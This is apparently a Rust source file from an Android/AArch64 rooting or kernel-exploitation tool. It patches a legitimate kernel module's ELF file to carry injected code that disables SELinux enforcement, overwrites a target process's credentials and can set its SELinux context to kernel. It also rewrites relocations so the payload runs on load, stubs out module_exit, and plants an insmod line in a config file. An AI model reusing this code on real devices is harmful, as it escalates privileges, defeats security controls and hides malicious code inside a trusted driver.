// Carrier .ko builders: build_carrier (enforcing-only diff-injection, Q3 two-carrier flow) and
// build_credmod (merged enforcing=0 + status-sync + cred-patch; .init.text or .text-splice mode).
// Pure Rust ELF manipulation — no clang, no llvm-objcopy/readelf.
#![allow(dead_code)]
use crate::elf::{Elf, R_AARCH64_ABS64, R_AARCH64_CALL26};
use crate::emit::{build_patch_init, cred_patch};

/// Q3 two-carrier flow: splice the 52-byte enforcing-only init patch into the carrier's .init.text,
/// repoint the CALL26 anchor reloc's r_offset, NONE the other in-region relocs. Returns patched bytes.
pub fn build_carrier(carrier_bytes: Vec<u8>, anchor_reloc_off: u64, delta: u32) -> Result<Vec<u8>, String> {
    let mut e = Elf::parse(carrier_bytes)?;
    let patch = build_patch_init(delta);
    let it = e.sec(".init.text").ok_or("no .init.text")?.clone();
    if it.size < patch.len() { return Err(format!(".init.text {} < patch {}", it.size, patch.len())); }
    let rela = e.sec(".rela.init.text").ok_or("no .rela.init.text")?.clone();
    e.splice(it.off, &patch);
    let n = rela.size / 24;
    let mut call26 = 0;
    for i in 0..n {
        let ent = rela.off + i * 24;
        let r_off = e.rd_u64(ent);
        let r_info = e.rd_u64(ent + 8);
        let typ = (r_info & 0xffffffff) as u32;
        if typ == R_AARCH64_CALL26 {
            e.wr_u64(ent, anchor_reloc_off);
            call26 += 1;
        } else if (r_off as usize) < patch.len() {
            e.wr_u64(ent + 8, 0); // R_AARCH64_NONE (whole r_info, matches Python)
        }
    }
    if call26 != 1 { return Err(format!("expected exactly one CALL26 anchor, found {}", call26)); }
    Ok(e.data)
}

/// insmod cfg: splice `insmod|<path>\n` + comment padding into the bounded inject region.
/// Returns (orig, patched).
pub fn build_cfg(orig: Vec<u8>, insmod_path: &str, inject_off: usize, inject_len: usize) -> Result<(Vec<u8>, Vec<u8>), String> {
    let mut line = Vec::new();
    line.extend_from_slice(b"insmod|");
    line.extend_from_slice(insmod_path.as_bytes());
    line.push(b'\n');
    if inject_len < line.len() {
        return Err(format!("cfg inject_len {} < insmod line {}B", inject_len, line.len()));
    }
    let mut newblk = line.clone();
    newblk.extend(std::iter::repeat(b'#').take(inject_len - line.len() - 1));
    newblk.push(b'\n');
    if newblk.len() != inject_len { return Err("cfg block size mismatch".into()); }
    let mut patched = orig.clone();
    patched[inject_off..inject_off + inject_len].copy_from_slice(&newblk);
    Ok((orig, patched))
}

/// Merged cred carrier. Diff-patch the carrier's init into cred_patch, rewriting the CALL26 anchor to
/// R_AARCH64_ABS64 at the anchor64 slot; auto-selects .init.text mode or .text-splice (small init).
/// deltas are signed 32-bit. ctx=Some(off) also sets SELinux context -> kernel.
pub fn build_credmod(carrier_bytes: Vec<u8>, dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
                     enf_off: u32, cred_off: u32, ctx: Option<u32>) -> Result<(Vec<u8>, String), String> {
    let (patch, anchor_local) = cred_patch(dsel, dfv, dpt, pid, dssuse, enf_off, cred_off, ctx);
    let mut e = Elf::parse(carrier_bytes)?;
    let it = e.sec(".init.text").ok_or("no .init.text")?.clone();
    let anchor_off = it.off + anchor_local; // absolute file offset later? -> reloc r_offset is section-relative

    let splice_mode;
    if it.size >= patch.len() {
        // ---- standard: splice into .init.text ----
        e.splice(it.off, &patch);
        let rela = e.sec(".rela.init.text").ok_or("no .rela.init.text")?.clone();
        let n = rela.size / 24;
        let mut repointed = 0;
        for i in 0..n {
            let ent = rela.off + i * 24;
            let r_off = e.rd_u64(ent);
            let r_info = e.rd_u64(ent + 8);
            let typ = (r_info & 0xffffffff) as u32;
            let sym = (r_info >> 32) as usize;
            if typ == R_AARCH64_CALL26 && e.symname(sym) == "__platform_driver_register" && repointed == 0 {
                e.wr_u64(ent, anchor_local as u64);                       // section-relative anchor64 slot
                e.wr_u64(ent + 8, ((sym as u64) << 32) | R_AARCH64_ABS64 as u64);
                e.wr_i64(ent + 16, 0);
                repointed += 1;
            } else if (r_off as usize) < patch.len() {
                e.wr_u64(ent + 8, 0); // R_AARCH64_NONE (keep sym=0)
            }
        }
        if repointed != 1 { return Err("did not find __platform_driver_register CALL26 anchor".into()); }
        splice_mode = ".init.text".to_string();
    } else {
        // ---- .text-splice: init too small; put patch in .text, repoint module->init, ABS64 anchor ----
        let txt = e.sec(".text").ok_or("no .text")?.clone();
        let txt_idx = e.sec_idx(".text").unwrap();
        if txt.size < patch.len() { return Err(format!(".text {} < patch {}", txt.size, patch.len())); }
        e.splice(txt.off, &patch);
        let pdr_sym = e.find_sym("__platform_driver_register").ok_or("no __platform_driver_register sym")?;
        let text_secsym = e.section_symbol(txt_idx).ok_or("no .text section symbol")?;
        // reloc section for .text (type SHT_RELA=4, sh_info == txt_idx)
        let rela = e.secs.iter().find(|s| s.typ == 4 && s.info as usize == txt_idx)
            .ok_or("no reloc section for .text")?.clone();
        for i in 0..(rela.size / 24) {
            let ent = rela.off + i * 24;
            let r_off = e.rd_u64(ent);
            if (r_off as usize) < patch.len() { e.wr_u64(ent + 8, 0); } // NONE within splice
        }
        // repurpose entry 0 as the ABS64 anchor
        let e0 = rela.off;
        e.wr_u64(e0, anchor_local as u64);
        e.wr_u64(e0 + 8, ((pdr_sym as u64) << 32) | R_AARCH64_ABS64 as u64);
        e.wr_i64(e0 + 16, 0);
        // repoint module->init to .text+0
        let tmr = e.sec(".rela.gnu.linkonce.this_module").ok_or("no .rela.gnu.linkonce.this_module")?.clone();
        let mut fixed = 0;
        for i in 0..(tmr.size / 24) {
            let ent = tmr.off + i * 24;
            let r_info = e.rd_u64(ent + 8);
            if e.symname((r_info >> 32) as usize) == "init_module" {
                e.wr_u64(ent + 8, ((text_secsym as u64) << 32) | R_AARCH64_ABS64 as u64);
                e.wr_i64(ent + 16, 0);
                fixed += 1;
            }
        }
        if fixed != 1 { return Err("did not find module->init reloc".into()); }
        splice_mode = ".text (init repointed)".to_string();
    }
    let _ = anchor_off;

    // neutralize module_exit: splice `ret` at .exit.text[0], NONE its in-range relocs
    if let Some(et) = e.sec(".exit.text").cloned() {
        if et.size >= 4 {
            e.wr_u32(et.off, 0xd65f03c0); // ret
            if let Some(er) = e.sec(".rela.exit.text").cloned() {
                for i in 0..(er.size / 24) {
                    let ent = er.off + i * 24;
                    let r_off = e.rd_u64(ent);
                    if (r_off as usize) < 4 { e.wr_u64(ent + 8, 0); }
                }
            }
        }
    }

    let msg = format!("patch {}B [{}], anchor@0x{:x}, pid={} dsel={:#x} dfv={:#x} dpt={:#x}",
                      patch.len(), splice_mode, anchor_local, pid,
                      dsel as u32, dfv as u32 & 0xffffffff, dpt as u32 & 0xffffffff);
    Ok((e.data, msg))
}
